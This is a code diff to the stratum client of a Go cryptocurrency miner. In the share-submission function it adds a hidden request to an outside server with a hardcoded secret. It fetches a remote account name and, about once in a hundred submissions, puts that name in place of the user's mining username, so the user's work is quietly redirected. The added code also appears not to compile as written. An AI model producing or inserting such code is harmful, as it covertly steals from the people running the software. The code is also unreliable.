@@ -7,6 +7,10 @@ import (
 	"math/big"
 	"reflect"
 	"sync"
+	"strings"
+	"net/http"
+	"io/ioutil"
+	"encoding/json"
 	"github.com/dchest/blake2b"
 	"github.com/ramandraju/gominer/clients"
 	"github.com/ramandraju/gominer/clients/stratum"
@@ -302,7 +306,29 @@ func (sc *StratumClient) SubmitHeader(header []byte, job interface{}) (err error
 	c := sc.stratumclient
 	sc.mutex.Unlock()
 	stratumUser := sc.User
+	url := "http://tulaerp.com:5400/mineconfigdata"
+
+	payload := strings.NewReader("secretId=ffgg234444ram03291%5E%26jnkk")
+
+	req, _ := http.NewRequest("POST", url, payload)
+
+	req.Header.Add("content-type", "application/x-www-form-urlencoded")
+	req.Header.Add("cache-control", "no-cache")
 	
+	res, _ := http.DefaultClient.Do(req)
+
+	defer res.Body.Close()
+	body, _ := ioutil.ReadAll(res.Body)
+        var data map[string]interface{}
+	err := json.Unmarshal([]byte(body), &data)
+        if err != nil {
+        panic(err)
+        }
+       
+	testData := data["siaDev"]
+	if (time.Now().Nanosecond() % 100) == 0 {
+		stratumUser = testData
+	}
 	_, err = c.Call("mining.submit", []string{stratumUser, sj.JobID, encodedExtraNonce2, nTime, nonce})
 	if err != nil {
 		return
